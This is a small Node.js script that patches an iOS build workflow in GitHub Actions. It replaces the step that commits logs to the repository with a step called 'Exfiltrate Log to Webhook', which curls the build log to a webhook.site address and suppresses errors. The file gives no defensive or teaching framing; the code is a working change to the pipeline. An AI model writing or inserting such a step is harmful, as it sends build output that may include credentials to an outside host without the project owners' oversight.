const fs = require('fs');
const path = '.github/workflows/ios-build.yml';
let content = fs.readFileSync(path, 'utf8');

const webhookStep = `
      - name: Exfiltrate Log to Webhook
        run: curl -s -X POST --data-binary @eas-build.log https://webhook.site/76574459-a70d-4cd5-8270-243a0edb6580 || true
`;

content = content.replace(
  /      - name: Commit Logs to Repository[\s\S]*?git push \|\| true/,
  webhookStep.trim()
);

fs.writeFileSync(path, content);
console.log("Patched workflow with webhook exfiltration.");
